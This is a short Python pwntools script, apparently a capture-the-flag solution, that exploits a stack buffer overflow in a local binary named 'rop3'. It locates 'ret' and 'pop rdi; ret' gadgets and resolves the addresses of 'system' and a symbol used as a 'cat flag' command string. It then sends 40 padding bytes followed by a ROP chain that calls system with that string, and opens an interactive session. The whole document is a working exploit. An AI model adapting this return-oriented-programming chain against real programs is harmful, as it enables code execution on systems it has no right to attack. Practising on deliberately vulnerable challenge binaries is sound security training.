#!/usr/bin/env python3

from pwn import *

TARGET = './rop3'

context.arch = 'amd64'

elf = ELF(TARGET)
p = process(TARGET)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"ret     : {hex(ret)}")
print(f"pop rdi : {hex(gadget)}")

system = elf.sym.system
cat_flag = elf.symbols['hmmm']
print(f"system  : {hex(system)}")
print(f"cat flag: {hex(cat_flag)}")

# pause()
payload = b'A' * 40 + p64(ret) + p64(gadget) + p64(cat_flag) + p64(system)
p.sendlineafter(b'ROP me: ', payload)

p.interactive()

